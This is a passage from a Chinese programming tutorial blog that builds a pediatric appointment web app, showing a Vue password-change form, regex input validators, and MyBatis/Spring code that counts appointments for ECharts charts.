&#125;<br>          &#125; else &#123;<br>            this.dialogVisible = true<br>            return false<br>          &#125;<br>        &#125;)<br><br>      &#125;)<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style lang=&quot;scss&quot; scoped&gt;<br>.title &#123;<br>  margin: 0 auto 30px auto;<br>  text-align: center;<br>  color: #707070;<br>&#125;<br>.register-box &#123;<br>  border: 1px green solid;<br>  width: 350px;<br>  margin: 80px auto;<br>  padding: 35px 35px 15px 35px;<br>  border-radius: 5px;<br>  -webkit-border-radius: 5px;<br>  -moz-border-radius: 5px;<br>  box-shadow: 0 0 25px #2c3e90;<br>&#125;<br>.register-title &#123;<br>  text-align: center;<br>  margin: 0 auto 40px auto;<br>  color: #af4f7e;<br>&#125;<br>.register-button &#123;<br>  margin-left: 60px;<br>  margin-top: 30px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>login下新建UpdatePassword.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;el-form ref=&quot;updatePasswordForm&quot; :model=&quot;form&quot; :rules=&quot;rules&quot;<br>             label-width=&quot;120px&quot; class=&quot;login-box&quot;&gt;<br>      &lt;br&gt;<br>      &lt;h3 class=&quot;title&quot;&gt;小宝贝看病病&lt;/h3&gt;<br>      &lt;h3 class=&quot;login-title&quot;&gt;修改密码&lt;/h3&gt;<br>      &lt;br&gt;<br>      &lt;el-form-item label=&quot;账号&quot; prop=&quot;id&quot;&gt;<br>        &lt;el-input type=&quot;text&quot; placeholder=&quot;请输入账号&quot; v-model=&quot;form.id&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item label=&quot;请输入原密码&quot; prop=&quot;password&quot;&gt;<br>        &lt;el-input type=&quot;password&quot; placeholder=&quot;请输入原密码&quot; v-model=&quot;form.password&quot;/&gt;<br>      &lt;/el-form-item&gt;<br>      &lt;br&gt;<br>      &lt;el-form-item label=&quot;请输入新密码&quot; prop=&quot;newPassword&quot;&gt;<br>        &lt;el-input type=&quot;password&quot; placeholder=&quot;请输入新密码&quot; v-model=&quot;form.newPassword&quot;/&gt;<br>      &lt;/el-form-item&gt;<br>      &lt;br&gt;<br>      &lt;el-form-item label=&quot;请确认新密码&quot; prop=&quot;confirmPassword&quot;&gt;<br>        &lt;el-input type=&quot;password&quot; placeholder=&quot;请确认新密码&quot; v-model=&quot;form.confirmPassword&quot;/&gt;<br>      &lt;/el-form-item&gt;<br><br>      &lt;el-form-item class=&quot;buttons&quot; style=&quot;margin-left: -100px&quot;&gt;<br>        &lt;el-button @click=&quot;toRegister()&quot;&gt;跳转注册页&lt;/el-button&gt;<br>        &lt;el-button @click=&quot;toLogin()&quot;&gt;跳转登录页&lt;/el-button&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;updatePassword(&#x27;updatePasswordForm&#x27;)&quot;&gt;确认修改密码&lt;/el-button&gt;<br>      &lt;/el-form-item&gt;<br><br>    &lt;/el-form&gt;<br><br>    &lt;el-dialog<br>      title=&quot;温馨提示&quot;<br>      :visible.sync=&quot;dialogVisible&quot;<br>      width=&quot;30%&quot;&gt;<br>      &lt;!--      :before-close=&quot;handleClose&quot;--&gt;<br>      &lt;span&gt;请输入账号和密码&lt;/span&gt;<br>      &lt;span slot=&quot;footer&quot; class=&quot;dialog-footer&quot;&gt;<br>        &lt;el-button type=&quot;primary&quot; @click=&quot;dialogVisible = false&quot;&gt;确定&lt;/el-button&gt;<br>      &lt;/span&gt;<br>    &lt;/el-dialog&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;checkPassword, login, updatePassword&#125; from &#x27;@/api/login&#x27;<br>import &#123;validatePsdReg&#125; from &#x27;@/views/login/validation&#x27;<br>export default &#123;<br>  name: &#x27;Login.vue&#x27;,<br>  data () &#123;<br>    return &#123;<br>      form: &#123;<br>        id: &#x27;&#x27;,<br>        password: &#x27;&#x27;,<br>        newPassword: &#x27;&#x27;,<br>        confirmPassword: &#x27;&#x27;,<br>        flag: &#x27;&#x27;<br>      &#125;,<br>      // 表单验证，需要在el-form-item元素中增加prop属性<br>      rules: &#123;<br>        id: [<br>          &#123;required: true, message: &#x27;账号不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;<br>        ],<br>        password: [<br>          &#123;required: true, message: &#x27;原密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123;<br>            validator: validatePsdReg,<br>            message: validatePsdReg.callback,<br>            trigger: &#x27;blur&#x27;<br>          &#125;<br>        ],<br>        newPassword: [<br>          &#123;required: true, message: &#x27;新密码不可为空&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123;<br>            validator: validatePsdReg,<br>            message: validatePsdReg.callback,<br>            trigger: &#x27;blur&#x27;<br>          &#125;<br>        ],<br>        confirmPassword: [<br>          &#123;required: true, message: &#x27;请再次输入新密码&#x27;, trigger: &#x27;blur&#x27;&#125;,<br>          &#123;<br>            validator:(rule,value,callback)=&gt;&#123;<br>              if(value===&#x27;&#x27;)&#123;<br>                callback(new Error(&#x27;请再次输入密码&#x27;))<br>              &#125;else if(value!==this.form.password)&#123;<br>                callback(new Error(&#x27;两次输入密码不一致&#x27;))<br>              &#125;else&#123;<br>                callback( )<br>              &#125;<br>            &#125;,<br>            trigger:&#x27;blur&#x27;<br>          &#125;<br>        ]<br>      &#125;,<br>      // 对话框和显示<br>      dialogVisible: false<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    updatePassword(formName) &#123;<br>      console.log(&#x27;start&#x27;)<br>      this.$refs[formName].validate((vaild) =&gt; &#123;<br>        if (vaild) &#123;<br>          checkPassword(this.form.id,this.form.password).then((res) =&gt; &#123;<br>            if(res.id !== undefined)&#123;<br>              updatePassword(this.form.id, this.form.newPassword)<br>              this.$notify(&#123;<br>                title: &#x27;提示信息&#x27;,<br>                message: &#x27;更改密码成功&#x27;,<br>                type: &#x27;success&#x27;<br>              &#125;)<br>            &#125;else &#123;<br>              this.$notify(&#123;<br>                title: &#x27;提示信息&#x27;,<br>                message: &#x27;密码与账号不匹配&#x27;,<br>                type: &#x27;error&#x27;<br>              &#125;)<br>            &#125;<br>          &#125;)<br>        &#125; else &#123;<br>          this.dialogVisible = true<br>          return false<br>        &#125;<br>      &#125;)<br>    &#125;,<br>    toLogin()&#123;<br>      this.$router.push(&#x27;/login&#x27;)<br>    &#125;,<br>    showPwd () &#123;<br>      if (this.passwordType === &#x27;password&#x27;) &#123;<br>        this.passwordType = &#x27;&#x27;<br>      &#125; else &#123;<br>        this.passwordType = &#x27;password&#x27;<br>      &#125;<br>      this.$nextTick(() =&gt; &#123;<br>        this.$refs.password.focus()<br>      &#125;)<br>    &#125;,<br>    toRegister () &#123;<br>      this.$router.push(&#x27;/register&#x27;)<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style lang=&quot;scss&quot; scoped&gt;<br>.title &#123;<br>  margin: 0 auto 30px auto;<br>  text-align: center;<br>  color: #707070;<br>&#125;<br><br>.login-box &#123;<br>  border: 1px green solid;<br>  width: 420px;<br>  margin: 80px auto;<br>  padding: 35px 35px 15px 35px;<br>  border-radius: 5px;<br>  -webkit-border-radius: 5px;<br>  -moz-border-radius: 5px;<br>  box-shadow: 0 0 25px #2c3e90;<br>&#125;<br><br>.login-title &#123;<br>  text-align: center;<br>  margin: 0 auto 40px auto;<br>  color: #af4f7e;<br>&#125;<br><br>.buttons &#123;<br>  //margin: 30px auto;<br>  margin-top: 40px;<br>  margin-left: 25px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>login文件夹下新建validation.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 是否电话号码</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">validatePhone</span>(<span class="hljs-params">rule, value,callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> reg =<span class="hljs-regexp">/^[1][3-9][0-9]&#123;9&#125;$/</span>;<br>  <span class="hljs-keyword">if</span>(value==<span class="hljs-string">&#x27;&#x27;</span>||value==<span class="hljs-literal">undefined</span>||value==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-title function_">callback</span>();<br>  &#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((!reg.<span class="hljs-title function_">test</span>(value)) &amp;&amp; value != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请输入正确的电话号码&#x27;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">callback</span>();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">//是否邮箱号</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateEMail</span>(<span class="hljs-params">rule, value,callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> reg =<span class="hljs-regexp">/^([a-zA-Z0-9]+[-_\.]?)+@[a-zA-Z0-9]+\.[a-z]+$/</span>;<br>  <span class="hljs-keyword">if</span>(value==<span class="hljs-string">&#x27;&#x27;</span>||value==<span class="hljs-literal">undefined</span>||value==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-title function_">callback</span>();<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span> (!reg.<span class="hljs-title function_">test</span>(value))&#123;<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请输入正确的邮箱&#x27;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">callback</span>();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">//是否身份证号</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateIdNo</span>(<span class="hljs-params">rule, value,callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> reg = <span class="hljs-regexp">/(^\d&#123;15&#125;$)|(^\d&#123;18&#125;$)|(^\d&#123;17&#125;(\d|X|x)$)/</span>;<br>  <span class="hljs-keyword">if</span>(value==<span class="hljs-string">&#x27;&#x27;</span>||value==<span class="hljs-literal">undefined</span>||value==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-title function_">callback</span>();<br>  &#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((!reg.<span class="hljs-title function_">test</span>(value)) &amp;&amp; value != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请输入正确的身份证号码&#x27;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">callback</span>();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查密码格式</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">validatePsdReg</span> = (<span class="hljs-params">rule, value, callback</span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (!value) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请输入密码&#x27;</span>))<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^(?![\d]+$)(?![a-zA-Z]+$)(?![^\da-zA-Z]+$)([^\u4e00-\u9fa5\s])&#123;6,20&#125;$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>    <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请输入6-20位英文字母、数字或者符号（除空格），且字母、数字和标点符号至少包含两种&#x27;</span>))<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">callback</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查是否为中文</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">validateContacts</span> = (<span class="hljs-params">rule, value, callback</span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (!value) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;请输入中文&#x27;</span>))<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[\u0391-\uFFE5A-Za-z]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>    <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;不可输入特殊字符&#x27;</span>))<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">callback</span>()<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置路由类似上个部分，不再复述。</p><h3 id="3、Echarts图"><a href="#3、Echarts图" class="headerlink" title="3、Echarts图"></a>3、Echarts图</h3><p>&#x3D;&#x3D;后端&#x3D;&#x3D;</p><p>主要是算数据给数据</p><p>OrderMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;countAge&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span><br>    select count(*) from order_info where patient_age<span class="hljs-symbol">&amp;gt;</span>=#&#123;age1&#125; and patient_age<span class="hljs-symbol">&amp;lt;</span>#&#123;age2&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;countDepartment&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span><br>    select count(*) from order_info where department=#&#123;department&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;countOrderByDoctorName&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span><br>    select count(*) from order_info where doctor_name=#&#123;doctorName&#125; and order_day &gt;= date(now()) - interval 7 day group by order_day ORDER BY order_day<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;countOrder&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span><br>    select count(*) from order_info where order_day &gt;= date(now()) - interval 7 day group by order_day ORDER BY order_day;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>dao&#x2F;OrderMapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.dao;<br><span class="hljs-keyword">import</span> com.xbb.entity.Order;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age1,<span class="hljs-type">int</span> age2)</span>;<span class="hljs-comment">//查询就诊年龄段对应的记录条数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countDepartment</span><span class="hljs-params">(String department)</span>;<span class="hljs-comment">//查询所挂科室的记录数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrder();<span class="hljs-comment">//查询未来一周预约人数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrderByDoctorName(String name);<span class="hljs-comment">//根据医生名查询未来一周预约人数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>OrderService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.service;<br><span class="hljs-keyword">import</span> com.xbb.entity.Order;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age1,<span class="hljs-type">int</span> age2)</span>;<span class="hljs-comment">//查询就诊年龄段对应的记录条数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countDepartment</span><span class="hljs-params">(String department)</span>;<span class="hljs-comment">//查询所挂科室的记录数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrder();<span class="hljs-comment">//查询未来一周预约人数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrderByDoctorName(String name);<span class="hljs-comment">//根据医生名查询未来一周预约人数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>OrderServiceImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.service.impl;<br><span class="hljs-keyword">import</span> com.xbb.dao.OrderMapper;<br><span class="hljs-keyword">import</span> com.xbb.entity.Order;<br><span class="hljs-keyword">import</span> com.xbb.service.OrderService;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OrderService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> OrderMapper orderMapper;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age1, <span class="hljs-type">int</span> age2)</span> &#123;<br>        <span class="hljs-keyword">return</span> orderMapper.countAge(age1,age2);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countDepartment</span><span class="hljs-params">(String department)</span> &#123;<br>        <span class="hljs-keyword">return</span> orderMapper.countDepartment(department);<br>    &#125;<br>    <br>        <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrder() &#123;<br>        <span class="hljs-keyword">return</span> orderMapper.countOrder();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] countOrderByDoctorName(String name) &#123;<br>        <span class="hljs-keyword">return</span> orderMapper.countOrderByDoctorName(name);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>OrderController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xbb.controller;<br><br><span class="hljs-keyword">import</span> com.xbb.entity.MedicalRecord;<br><span class="hljs-keyword">import</span> com.xbb.entity.Order;<br><span class="hljs-keyword">import</span> com.xbb.service.impl.MedicalRecordServiceImpl;<br><span class="hljs-keyword">import</span> com.xbb.service.impl.OrderServiceImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.beans.propertyeditors.CustomDateEditor;<br><span class="hljs-keyword">import</span> org.springframework.beans.propertyeditors.CustomNumberEditor;<br><span class="hljs-keyword">import</span> org.springframework.beans.propertyeditors.StringTrimmerEditor;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.WebDataBinder;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><span class="hljs-keyword">import</span> java.text.DateFormat;<br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(value = &quot;/order&quot;)</span><br><span class="hljs-keyword">public</span> <span 